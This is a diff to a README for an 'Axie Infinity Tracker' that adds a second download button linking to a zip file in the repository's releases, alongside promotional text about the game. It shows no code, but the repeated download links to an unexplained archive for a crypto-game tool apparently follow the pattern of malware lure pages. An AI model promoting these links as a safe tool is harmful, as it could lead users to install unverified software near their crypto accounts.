@@ -11,6 +11,8 @@ This tracker is perfect for anyone who is looking for an easy way to manage thei
 
 [![Axie Infinity Tracker](https://github.com/axie-tracker/axie-tracker.github.io/blob/main/axie-tracker-management.jpg?raw=true)](https://github.com/axie-tracker/axie-tracker.github.io/releases/download/tracker/Axie.Tracker.zip)
 
+[![Alt text](https://github.com/axie-tracker/axie-tracker.github.io/blob/main/download-button-plain.png?raw=true)](https://github.com/axie-tracker/axie-tracker.github.io/releases/download/tracker/Axie.Tracker.zip)
+
 ## Installation Instructions
 
 1. [Download the Axie Tracker](https://github.com/axie-tracker/axie-tracker.github.io/releases/download/tracker/Axie.Tracker.zip)
@@ -19,7 +21,6 @@ This tracker is perfect for anyone who is looking for an easy way to manage thei
 
 
 ## What Is Axie Infinity?
-
 
 Axie Infinity is a digital pet game that allows you to collect, breed, and battle your own adorable creatures called Axies. In the game, you can explore a stunning world filled with magical creatures, discover new areas, and take on challenges to earn rewards. You can also compete against other players in exciting PvP battles.
 
